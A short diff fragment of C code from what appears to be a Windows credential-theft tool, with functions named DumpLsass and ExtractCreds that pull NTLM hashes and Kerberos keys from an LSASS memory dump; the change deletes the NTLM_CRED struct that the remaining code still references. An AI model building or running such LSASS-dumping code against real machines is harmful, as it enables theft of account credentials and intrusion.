@@ -53,7 +53,6 @@ static PBYTE DumpLsass(HANDLE hLsass, SIZE_T* outSize) {
 }
 
 // ─── Credential extraction ───
-typedef struct { DWORD rid; WCHAR name[128]; BYTE ntlm[16]; BYTE lm[16]; } NTLM_CRED;
 typedef struct { WCHAR name[128]; BYTE key[32]; DWORD type; } KERB_KEY;
 
 static DWORD ExtractCreds(PBYTE dump, SIZE_T size, NTLM_CRED** outNtlm, KERB_KEY** outKerb) {
